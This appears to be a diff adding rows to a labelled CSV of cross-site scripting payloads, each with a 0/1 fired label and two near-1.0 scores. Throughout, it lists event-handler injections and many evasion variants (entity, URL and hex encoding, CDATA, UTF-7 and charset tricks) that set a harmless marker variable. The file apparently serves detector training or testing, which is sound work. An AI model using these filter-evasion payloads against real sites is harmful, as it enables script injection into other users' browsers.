+&#60;mark oncut=&#34;window.__xss_fired=true&#34; contenteditable&#62;test&#60;/mark&#62;,0,0.9999387,0.9999373
+"<mark oncut=""&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;"" contenteditable>test</mark>",1,0.9999378,0.9999379
+"<mark oncut=""window['__xss_fired']=true"" contenteditable>test</mark>",1,0.99993896,0.99992514
+"<mark oncut=""window['__xss'+'_fired']=true"" contenteditable>test</mark>",1,0.9999379,0.9999225
+"<mark oncut=""window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true"" contenteditable>test</mark>",1,0.99993336,0.999931
+<input id=x tabindex=1 ondeactivate=window.__xss_fired=true></input><input id=y autofocus>,0,0.99993134,0.9999318
+%3cinput%20id%3dx%20tabindex%3d1%20ondeactivate%3dwindow.__xss_fired%3dtrue%3e%3c/input%3e%3cinput%20id%3dy%20autofocus%3e,0,0.9998884,0.9998789
+&#60;input id=x tabindex=1 ondeactivate=window.__xss_fired=true&#62;&#60;/input&#62;&#60;input id=y autofocus&#62;,0,0.9999274,0.9999281
+<input id=x tabindex=1 ondeactivate=&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;></input><input id=y autofocus>,0,0.9999336,0.9999347
+<input id=x tabindex=1 ondeactivate=window['__xss_fired']=true></input><input id=y autofocus>,0,0.99993134,0.9999312
+<input id=x tabindex=1 ondeactivate=window['__xss'+'_fired']=true></input><input id=y autofocus>,0,0.9999341,0.9999336
+<input id=x tabindex=1 ondeactivate=window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true></input><input id=y autofocus>,0,0.99993145,0.99993193
+<listing id=x tabindex=1 onbeforeactivate=window.__xss_fired=true></listing>,0,0.9999341,0.99993014
+%3clisting%20id%3dx%20tabindex%3d1%20onbeforeactivate%3dwindow.__xss_fired%3dtrue%3e%3c/listing%3e,0,0.99985266,0.9997689
+&#60;listing id=x tabindex=1 onbeforeactivate=window.__xss_fired=true&#62;&#60;/listing&#62;,0,0.9999341,0.9999337
+<listing id=x tabindex=1 onbeforeactivate=&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;></listing>,0,0.9999349,0.9999362
+<listing id=x tabindex=1 onbeforeactivate=window['__xss_fired']=true></listing>,0,0.9999316,0.9999243
+<listing id=x tabindex=1 onbeforeactivate=window['__xss'+'_fired']=true></listing>,0,0.99993396,0.999926
+<listing id=x tabindex=1 onbeforeactivate=window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true></listing>,0,0.9999232,0.99992144
+"<meta draggable=""true"" ondragend=""window.__xss_fired=true"">test</meta>",1,0.99993813,0.99993324
+%3cmeta%20draggable%3d%22true%22%20ondragend%3d%22window.__xss_fired%3dtrue%22%3etest%3c/meta%3e,1,0.99991214,0.99988174
+&#60;meta draggable=&#34;true&#34; ondragend=&#34;window.__xss_fired=true&#34;&#62;test&#60;/meta&#62;,0,0.9999374,0.9999354
+"<meta draggable=""true"" ondragend=""&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;"">test</meta>",1,0.9999405,0.999941
+"<meta draggable=""true"" ondragend=""window['__xss_fired']=true"">test</meta>",1,0.9999362,0.99992704
+"<meta draggable=""true"" ondragend=""window['__xss'+'_fired']=true"">test</meta>",1,0.99993706,0.99992657
+"<meta draggable=""true"" ondragend=""window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true"">test</meta>",1,0.9999298,0.99993205
+<object onpointerdown=window.__xss_fired=true>xss</object>,1,0.9999417,0.9999405
+%3cobject%20onpointerdown%3dwindow.__xss_fired%3dtrue%3exss%3c/object%3e,1,0.9999263,0.99992716
+&#60;object onpointerdown=window.__xss_fired=true&#62;xss&#60;/object&#62;,0,0.9999411,0.999941
+<object onpointerdown=&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;>xss</object>,1,0.99993575,0.9999405
+<object onpointerdown=window['__xss_fired']=true>xss</object>,1,0.9999399,0.9999367
+<object onpointerdown=window['__xss'+'_fired']=true>xss</object>,1,0.9999385,0.99993455
+<object onpointerdown=window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true>xss</object>,1,0.99994016,0.9999393
+"<xmp draggable=""true"" ondrag=""window.__xss_fired=true"">test</xmp>",1,0.9999393,0.9999379
+%3cxmp%20draggable%3d%22true%22%20ondrag%3d%22window.__xss_fired%3dtrue%22%3etest%3c/xmp%3e,1,0.9999238,0.9999206
+&#60;xmp draggable=&#34;true&#34; ondrag=&#34;window.__xss_fired=true&#34;&#62;test&#60;/xmp&#62;,0,0.9999367,0.99993646
+"<xmp draggable=""true"" ondrag=""&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;"">test</xmp>",1,0.99994123,0.9999418
+"<xmp draggable=""true"" ondrag=""window['__xss_fired']=true"">test</xmp>",1,0.99993885,0.9999356
+"<xmp draggable=""true"" ondrag=""window['__xss'+'_fired']=true"">test</xmp>",1,0.9999404,0.99993634
+"<xmp draggable=""true"" ondrag=""window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true"">test</xmp>",1,0.9999355,0.9999372
+"<div draggable=""true"" contenteditable>drag me</div><tfoot ondrop=window.__xss_fired=true contenteditable>drop here</tfoot>",0,0.99993885,0.9999279
+%3cdiv%20draggable%3d%22true%22%20contenteditable%3edrag%20me%3c/div%3e%3ctfoot%20ondrop%3dwindow.__xss_fired%3dtrue%20contenteditable%3edrop%20here%3c/tfoot%3e,0,0.9995739,0.9929022
+&#60;div draggable=&#34;true&#34; contenteditable&#62;drag me&#60;/div&#62;&#60;tfoot ondrop=window.__xss_fired=true contenteditable&#62;drop here&#60;/tfoot&#62;,0,0.99993587,0.99992824
+"<div draggable=""true"" contenteditable>drag me</div><tfoot ondrop=&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101; contenteditable>drop here</tfoot>",0,0.99993837,0.99993265
+"<div draggable=""true"" contenteditable>drag me</div><tfoot ondrop=window['__xss_fired']=true contenteditable>drop here</tfoot>",0,0.9999368,0.99991727
+"<div draggable=""true"" contenteditable>drag me</div><tfoot ondrop=window['__xss'+'_fired']=true contenteditable>drop here</tfoot>",0,0.9999379,0.99992156
+"<div draggable=""true"" contenteditable>drag me</div><tfoot ondrop=window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true contenteditable>drop here</tfoot>",0,0.99992454,0.999908
+<details onfocusout=window.__xss_fired=true tabindex=1 id=x></details><input autofocus>,1,0.9999269,0.99992335
+%3cdetails%20onfocusout%3dwindow.__xss_fired%3dtrue%20tabindex%3d1%20id%3dx%3e%3c/details%3e%3cinput%20autofocus%3e,1,0.99985147,0.99981767
+&#60;details onfocusout=window.__xss_fired=true tabindex=1 id=x&#62;&#60;/details&#62;&#60;input autofocus&#62;,0,0.999931,0.9999299
+<details onfocusout=&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101; tabindex=1 id=x></details><input autofocus>,1,0.99992955,0.99992776
+<details onfocusout=window['__xss_fired']=true tabindex=1 id=x></details><input autofocus>,1,0.99992406,0.9999163
+<details onfocusout=window['__xss'+'_fired']=true tabindex=1 id=x></details><input autofocus>,1,0.9999244,0.9999156
+<details onfocusout=window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true tabindex=1 id=x></details><input autofocus>,1,0.9999218,0.9999162
+"<nextid onpaste=""window.__xss_fired=true"" contenteditable>test</nextid>",1,0.9999404,0.99993646
+%3cnextid%20onpaste%3d%22window.__xss_fired%3dtrue%22%20contenteditable%3etest%3c/nextid%3e,1,0.9999207,0.9999075
+&#60;nextid onpaste=&#34;window.__xss_fired=true&#34; contenteditable&#62;test&#60;/nextid&#62;,0,0.9999405,0.9999397
+"<nextid onpaste=""&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;"" contenteditable>test</nextid>",1,0.9999392,0.9999391
+"<nextid onpaste=""window['__xss_fired']=true"" contenteditable>test</nextid>",1,0.9999387,0.9999316
+"<nextid onpaste=""window['__xss'+'_fired']=true"" contenteditable>test</nextid>",1,0.99993694,0.99992824
+"<nextid onpaste=""window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true"" contenteditable>test</nextid>",1,0.99993515,0.9999336
+"<title onbeforecut=""window.__xss_fired=true"" contenteditable>test</title>",1,0.9999403,0.9999291
+%3ctitle%20onbeforecut%3d%22window.__xss_fired%3dtrue%22%20contenteditable%3etest%3c/title%3e,1,0.9998586,0.9997112
+&#60;title onbeforecut=&#34;window.__xss_fired=true&#34; contenteditable&#62;test&#60;/title&#62;,0,0.99993956,0.99993694
+"<title onbeforecut=""&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;"" contenteditable>test</title>",1,0.99993765,0.9999343
+"<title onbeforecut=""window['__xss_fired']=true"" contenteditable>test</title>",1,0.9999368,0.99991584
+"<title onbeforecut=""window['__xss'+'_fired']=true"" contenteditable>test</title>",1,0.9999337,0.9999101
+"<title onbeforecut=""window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true"" contenteditable>test</title>",1,0.99993014,0.9999244
+<param onpointerleave=window.__xss_fired=true>xss</param>,1,0.99994254,0.99994075
+%3cparam%20onpointerleave%3dwindow.__xss_fired%3dtrue%3exss%3c/param%3e,1,0.9999261,0.99992585
+&#60;param onpointerleave=window.__xss_fired=true&#62;xss&#60;/param&#62;,0,0.9999393,0.9999392
+<param onpointerleave=&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;>xss</param>,1,0.99993646,0.9999404
+<param onpointerleave=window['__xss_fired']=true>xss</param>,1,0.9999405,0.99993634
+<param onpointerleave=window['__xss'+'_fired']=true>xss</param>,1,0.999938,0.9999325
+<param onpointerleave=window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true>xss</param>,1,0.9999403,0.99993837
+"<article onmouseleave=""window.__xss_fired=true"">test</article>",1,0.99993646,0.9999305
+%3carticle%20onmouseleave%3d%22window.__xss_fired%3dtrue%22%3etest%3c/article%3e,1,0.9999169,0.99989796
+&#60;article onmouseleave=&#34;window.__xss_fired=true&#34;&#62;test&#60;/article&#62;,0,0.9999409,0.9999404
+"<article onmouseleave=""&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;"">test</article>",1,0.9999409,0.99994004
+"<article onmouseleave=""window['__xss_fired']=true"">test</article>",1,0.99993455,0.9999225
+"<article onmouseleave=""window['__xss'+'_fired']=true"">test</article>",1,0.999936,0.9999244
+"<article onmouseleave=""window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true"">test</article>",1,0.9999335,0.9999324
+"<tr onbeforecut=""window.__xss_fired=true"" contenteditable>test</tr>",0,0.9999422,0.999938
+%3ctr%20onbeforecut%3d%22window.__xss_fired%3dtrue%22%20contenteditable%3etest%3c/tr%3e,0,0.99991155,0.9998754
+&#60;tr onbeforecut=&#34;window.__xss_fired=true&#34; contenteditable&#62;test&#60;/tr&#62;,0,0.99994135,0.9999404
+"<tr onbeforecut=""&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;"" contenteditable>test</tr>",0,0.9999387,0.999938
+"<tr onbeforecut=""window['__xss_fired']=true"" contenteditable>test</tr>",0,0.99994135,0.9999337
+"<tr onbeforecut=""window['__xss'+'_fired']=true"" contenteditable>test</tr>",0,0.99994016,0.9999305
+"<tr onbeforecut=""window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true"" contenteditable>test</tr>",0,0.999936,0.9999347
+"<title onbeforepaste=""window.__xss_fired=true"" contenteditable>test</title>",1,0.99994016,0.99993014
+%3ctitle%20onbeforepaste%3d%22window.__xss_fired%3dtrue%22%20contenteditable%3etest%3c/title%3e,1,0.99988925,0.999821
+&#60;title onbeforepaste=&#34;window.__xss_fired=true&#34; contenteditable&#62;test&#60;/title&#62;,0,0.99993956,0.9999378
+"<title onbeforepaste=""&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;"" contenteditable>test</title>",1,0.9999385,0.99993575
+"<title onbeforepaste=""window['__xss_fired']=true"" contenteditable>test</title>",1,0.9999368,0.9999186
+"<title onbeforepaste=""window['__xss'+'_fired']=true"" contenteditable>test</title>",1,0.9999336,0.99991333
+"<title onbeforepaste=""window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true"" contenteditable>test</title>",1,0.9999298,0.9999254
+"<tbody oncontextmenu=""window.__xss_fired=true"">test</tbody>",0,0.99993587,0.9999274
+%3ctbody%20oncontextmenu%3d%22window.__xss_fired%3dtrue%22%3etest%3c/tbody%3e,0,0.99991715,0.99991345
+&#60;tbody oncontextmenu=&#34;window.__xss_fired=true&#34;&#62;test&#60;/tbody&#62;,0,0.99993575,0.99993503
+"<tbody oncontextmenu=""&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;"">test</tbody>",0,0.9999367,0.9999337
+"<tbody oncontextmenu=""window['__xss_fired']=true"">test</tbody>",0,0.99993086,0.9999114
+"<tbody oncontextmenu=""window['__xss'+'_fired']=true"">test</tbody>",0,0.99992967,0.99991095
+"<tbody oncontextmenu=""window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true"">test</tbody>",0,0.99992883,0.99992466
+"<style>@keyframes slidein {}</style><div style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""window.__xss_fired=true""></div>",1,0.9999145,0.9998753
+%3cstyle%3e@keyframes%20slidein%20{}%3c/style%3e%3cdiv%20style%3d%22animation-duration:1s;animation-name:slidein;animation-iteration-count:2%22%20onanimationiteration%3d%22window.__xss_fired%3dtrue%22%3e%3c/div%3e,1,0.9998685,0.99964106
+&#60;style&#62;@keyframes slidein {}&#60;/style&#62;&#60;div style=&#34;animation-duration:1s;animation-name:slidein;animation-iteration-count:2&#34; onanimationiteration=&#34;window.__xss_fired=true&#34;&#62;&#60;/div&#62;,0,0.99993587,0.99993134
+"<style>@keyframes slidein {}</style><div style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;""></div>",1,0.99992085,0.99988425
+"<style>@keyframes slidein {}</style><div style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""window['__xss_fired']=true""></div>",1,0.999892,0.99978334
+"<style>@keyframes slidein {}</style><div style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""window['__xss'+'_fired']=true""></div>",1,0.9998791,0.99977833
+"<style>@keyframes slidein {}</style><div style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true""></div>",1,0.9998946,0.9998833
+"<figure onmouseup=""window.__xss_fired=true"">test</figure>",1,0.9999379,0.9999324
+%3cfigure%20onmouseup%3d%22window.__xss_fired%3dtrue%22%3etest%3c/figure%3e,1,0.9999181,0.9999107
+&#60;figure onmouseup=&#34;window.__xss_fired=true&#34;&#62;test&#60;/figure&#62;,0,0.9999356,0.9999348
+"<figure onmouseup=""&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;"">test</figure>",1,0.9999368,0.99993706
+"<figure onmouseup=""window['__xss_fired']=true"">test</figure>",1,0.99993575,0.9999254
+"<figure onmouseup=""window['__xss'+'_fired']=true"">test</figure>",1,0.99993634,0.999926
+"<figure onmouseup=""window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true"">test</figure>",1,0.99993217,0.9999298
+"<?xml version=""1.0"" encoding=""iso-8859-1""?><foo><![cdata[<]]>script<![cdata[>]]>window.__xss_fired=true;<![cdata[<]]>/script<![cdata[>]]></foo>",0,0.99993825,0.99993694
+%3c?xml%20version%3d%221.0%22%20encoding%3d%22iso-8859-1%22?%3e%3cfoo%3e%3c![cdata[%3c]]%3escript%3c![cdata[%3e]]%3ewindow.__xss_fired%3dtrue;%3c![cdata[%3c]]%3e/script%3c![cdata[%3e]]%3e%3c/foo%3e,0,0.9998785,0.99987304
+&#60;?xml version=&#34;1.0&#34; encoding=&#34;iso-8859-1&#34;?&#62;&#60;foo&#62;&#60;![cdata[&#60;]]&#62;script&#60;![cdata[&#62;]]&#62;window.__xss_fired=true;&#60;![cdata[&#60;]]&#62;/script&#60;![cdata[&#62;]]&#62;&#60;/foo&#62;,0,0.9999305,0.9999274
+"<?xml version=""1.0"" encoding=""iso-8859-1""?><foo><![cdata[<]]>script<![cdata[>]]>window['__xss_fired']=true;<![cdata[<]]>/script<![cdata[>]]></foo>",0,0.99993455,0.9999306
+"<?xml version=""1.0"" encoding=""iso-8859-1""?><foo><![cdata[<]]>script<![cdata[>]]>window['__xss'+'_fired']=true;<![cdata[<]]>/script<![cdata[>]]></foo>",0,0.99992967,0.999923
+"<?xml version=""1.0"" encoding=""iso-8859-1""?><foo><![cdata[<]]>script<![cdata[>]]>window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true;<![cdata[<]]>/script<![cdata[>]]></foo>",0,0.9999269,0.9999201
+"<x '=""foo""><x foo='><img src=x onerror=javascript:window.__xss_fired=true//'>",0,0.99994135,0.99994206
+%3cx%20%27%3d%22foo%22%3e%3cx%20foo%3d%27%3e%3cimg%20src%3dx%20onerror%3djavascript:window.__xss_fired%3dtrue//%27%3e,0,0.99991,0.99990034
+&#60;x '=&#34;foo&#34;&#62;&#60;x foo='&#62;&#60;img src=x onerror=javascript:window.__xss_fired=true//'&#62;,0,0.9999405,0.9999411
+"<x '=""foo""><x foo='><img src=x onerror=j&#97;v&#97;scr&#105;pt:&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;//'>",0,0.99993694,0.9999392
+"<x '=""foo""><x foo='><img src=x onerror=javascript:window['__xss_fired']=true//'>",0,0.9999411,0.99994075
+"<x '=""foo""><x foo='><img src=x onerror=javascript:window['__xss'+'_fired']=true//'>",0,0.99994195,0.9999417
+"<x '=""foo""><x foo='><img src=x onerror=javascript:window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true//'>",0,0.9999387,0.99993885
++aciapga8-script+ad4-window.__xss_fired=true+adw-/script+ad4apaai-,0,0.9999256,0.9999244
+%2baciapga8-script%2bad4-window.__xss_fired%3dtrue%2badw-/script%2bad4apaai-,0,0.9999182,0.9999026
++aciapga8-script+ad4-window['__xss_fired']=true+adw-/script+ad4apaai-,0,0.99992466,0.99992037
++aciapga8-script+ad4-window['__xss'+'_fired']=true+adw-/script+ad4apaai-,0,0.99992824,0.9999207
++aciapga8-script+ad4-window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true+adw-/script+ad4apaai-,0,0.99991906,0.9999168
+"<br size=""&{javascript:window.__xss_fired=true}"">",0,0.99993336,0.99992454
+%3cbr%20size%3d%22%26{javascript:window.__xss_fired%3dtrue}%22%3e,0,0.9999361,0.999936
+&#60;br size=&#34;&#38;{javascript:window.__xss_fired=true}&#34;&#62;,0,0.9999435,0.99994326
+"<br size=""&{javascript:window['__xss_fired']=true}"">",0,0.99992967,0.9999132
+"<br size=""&{javascript:window['__xss'+'_fired']=true}"">",0,0.9999312,0.9999157
+"<br size=""&{javascript:window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true}"">",0,0.99993014,0.99992836
+&lt;/title&gt;&lt;script&gt;window.__xss_fired=true;&lt;/script&gt;,0,0.99994147,0.9999405
+%26lt;/title%26gt;%26lt;script%26gt;window.__xss_fired%3dtrue;%26lt;/script%26gt;,0,0.9999393,0.999941
+&#38;lt;/title&#38;gt;&#38;lt;script&#38;gt;window.__xss_fired=true;&#38;lt;/script&#38;gt;,0,0.9999404,0.9999404
+&lt;/title&gt;&lt;script&gt;window['__xss_fired']=true;&lt;/script&gt;,0,0.99994147,0.9999386
+&lt;/title&gt;&lt;script&gt;window['__xss'+'_fired']=true;&lt;/script&gt;,0,0.99993944,0.9999367
+&lt;/title&gt;&lt;script&gt;window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true;&lt;/script&gt;,0,0.99993384,0.9999329
+<image src =q onerror=window.__xss_fired=true>,1,0.9999348,0.9999281
+%3cimage%20src%20%3dq%20onerror%3dwindow.__xss_fired%3dtrue%3e,1,0.9999113,0.9998572
+&#60;image src =q onerror=window.__xss_fired=true&#62;,0,0.99993956,0.99993706
+<image src =q onerror=&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;>,1,0.9999368,0.9999398
+<image src =q onerror=window['__xss_fired']=true>,1,0.99993193,0.9999194
+<image src =q onerror=window['__xss'+'_fired']=true>,1,0.9999335,0.99992216
+<image src =q onerror=window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true>,1,0.999936,0.9999342
+"<meta charset=""mac-farsi"">¼script¾javascript:window.__xss_fired=true¼/script¾",0,0.99993694,0.99993706
+%3cmeta%20charset%3d%22mac-farsi%22%3e¼script¾javascript:window.__xss_fired%3dtrue¼/script¾,0,0.9999325,0.9999336
+&#60;meta charset=&#34;mac-farsi&#34;&#62;¼script¾javascript:window.__xss_fired=true¼/script¾,0,0.9999405,0.9999411
+"<meta charset=""mac-farsi"">¼script¾javascript:window['__xss_fired']=true¼/script¾",0,0.99993575,0.99993396
+"<meta charset=""mac-farsi"">¼script¾javascript:window['__xss'+'_fired']=true¼/script¾",0,0.9999374,0.99993515
+"<meta charset=""mac-farsi"">¼script¾javascript:window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true¼/script¾",0,0.99992955,0.9999286
+"""`'><script>\xe2\x80\x8ajavascript:window.__xss_fired=true</script>",0,0.9999411,0.99994195
+%22`%27%3e%3cscript%3e\xe2\x80\x8ajavascript:window.__xss_fired%3dtrue%3c/script%3e,0,0.99993014,0.99993384
+&#34;`'&#62;&#60;script&#62;\xe2\x80\x8ajavascript:window.__xss_fired=true&#60;/script&#62;,0,0.99993896,0.9999397
+"""`'><script>\xe2\x80\x8ajavascript:window['__xss_fired']=true</script>",0,0.9999416,0.99994075
+"""`'><script>\xe2\x80\x8ajavascript:window['__xss'+'_fired']=true</script>",0,0.99994254,0.99994206
+"""`'><script>\xe2\x80\x8ajavascript:window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true</script>",0,0.9999378,0.9999385
+<script>({0:#0=eval/#0#/#0#(javascript:window.__xss_fired=true)})</script>,0,0.99994504,0.99994516
+%3cscript%3e({0:%230%3deval/%230%23/%230%23(javascript:window.__xss_fired%3dtrue)})%3c/script%3e,0,0.9999398,0.99993956
+&#60;script&#62;({0:#0=eval/#0#/#0#(javascript:window.__xss_fired=true)})&#60;/script&#62;,0,0.9999424,0.9999428
+<script>({0:#0=eval/#0#/#0#(javascript:window['__xss_fired']=true)})</script>,0,0.9999449,0.9999442
+<script>({0:#0=eval/#0#/#0#(javascript:window['__xss'+'_fired']=true)})</script>,0,0.999944,0.9999428
+<script>({0:#0=eval/#0#/#0#(javascript:window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true)})</script>,0,0.9999434,0.9999435
+<;scrscriptipt>;window.__xss_fired=true<;/scrscriptipt>;,0,0.99994075,0.9999403
+%3c;scrscriptipt%3e;window.__xss_fired%3dtrue%3c;/scrscriptipt%3e;,0,0.99993837,0.9999391
+&#60;;scrscriptipt&#62;;window.__xss_fired=true&#60;;/scrscriptipt&#62;;,0,0.99993134,0.9999312
+<;scrscriptipt>;window['__xss_fired']=true<;/scrscriptipt>;,0,0.999941,0.9999379
+<;scrscriptipt>;window['__xss'+'_fired']=true<;/scrscriptipt>;,0,0.9999379,0.9999325
+<;scrscriptipt>;window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true<;/scrscriptipt>;,0,0.9999391,0.9999341
+</br style=a:expression(window.__xss_fired=true)>,0,0.9999404,0.99992824
+%3c/br%20style%3da:expression(window.__xss_fired%3dtrue)%3e,0,0.9999391,0.9999324
+&#60;/br style=a:expression(window.__xss_fired=true)&#62;,0,0.999943,0.99993706
+</br style=a:expression(window['__xss_fired']=true)>,0,0.9999374,0.9999175
+</br style=a:expression(window['__xss'+'_fired']=true)>,0,0.9999373,0.99991465
+</br style=a:expression(window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true)>,0,0.9999331,0.99993217
+&lt;img lowsrc=&quot;javascript:window.__xss_fired=true;&quot;&gt;,0,0.9999399,0.99993765
+%26lt;img%20lowsrc%3d%26quot;javascript:window.__xss_fired%3dtrue;%26quot;%26gt;,0,0.9999372,0.9999366
+&#38;lt;img lowsrc=&#38;quot;javascript:window.__xss_fired=true;&#38;quot;&#38;gt;,0,0.99993896,0.9999391
+&lt;img lowsrc=&quot;javascript:window['__xss_fired']=true;&quot;&gt;,0,0.99993956,0.99993503
+&lt;img lowsrc=&quot;javascript:window['__xss'+'_fired']=true;&quot;&gt;,0,0.9999387,0.99993336
+&lt;img lowsrc=&quot;javascript:window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true;&quot;&gt;,0,0.99993336,0.99993205
+"<html onmousemove html onmousemove=""javascript:javascript:window.__xss_fired=true""></html onmousemove>",0,0.99993896,0.99993765
+%3chtml%20onmousemove%20html%20onmousemove%3d%22javascript:javascript:window.__xss_fired%3dtrue%22%3e%3c/html%20onmousemove%3e,0,0.9999311,0.9999298
+&#60;html onmousemove html onmousemove=&#34;javascript:javascript:window.__xss_fired=true&#34;&#62;&#60;/html onmousemove&#62;,0,0.99993956,0.9999405
+"<html onmousemove html onmousemove=""j&#97;v&#97;scr&#105;pt:j&#97;v&#97;scr&#105;pt:&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;""></html onmousemove>",0,0.99992967,0.999925
+"<html onmousemove html onmousemove=""javascript:javascript:window['__xss_fired']=true""></html onmousemove>",0,0.9999374,0.999933
+"<html onmousemove html onmousemove=""javascript:javascript:window['__xss'+'_fired']=true""></html onmousemove>",0,0.9999385,0.9999342
+"<html onmousemove html onmousemove=""javascript:javascript:window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true""></html onmousemove>",0,0.9999324,0.9999324
+"<script>referenceerror.prototype.__definegetter__('name', function(){window.__xss_fired=true}),x</script>",1,0.999943,0.9999397
+"%3cscript%3ereferenceerror.prototype.__definegetter__(%27name%27,%20function(){window.__xss_fired%3dtrue}),x%3c/script%3e",1,0.9999404,0.99993753
+"&#60;script&#62;referenceerror.prototype.__definegetter__('name', function(){window.__xss_fired=true}),x&#60;/script&#62;",0,0.9999429,0.99994195
+"<script>referenceerror.prototype.__definegetter__('name', function(){window['__xss_fired']=true}),x</script>",1,0.99994016,0.99993527
+"<script>referenceerror.prototype.__definegetter__('name', function(){window['__xss'+'_fired']=true}),x</script>",1,0.9999374,0.9999329
+"<script>referenceerror.prototype.__definegetter__('name', function(){window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true}),x</script>",1,0.9999355,0.9999354
+"&lt;img lowsrc=\""javascript&#058;window.__xss_fired=true\""&gt;",0,0.99994147,0.9999429
+%26lt;img%20lowsrc%3d\%22javascript%26%23058;window.__xss_fired%3dtrue\%22%26gt;,0,0.9999335,0.999936
+&#38;lt;img lowsrc=\&#34;javascript&#38;#058;window.__xss_fired=true\&#34;&#38;gt;,0,0.9999391,0.99994016
+"&lt;img lowsrc=\""javascript&#058;window['__xss_fired']=true\""&gt;",0,0.9999418,0.99994266
+"&lt;img lowsrc=\""javascript&#058;window['__xss'+'_fired']=true\""&gt;",0,0.9999424,0.9999434
+"&lt;img lowsrc=\""javascript&#058;window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true\""&gt;",0,0.9999378,0.9999372
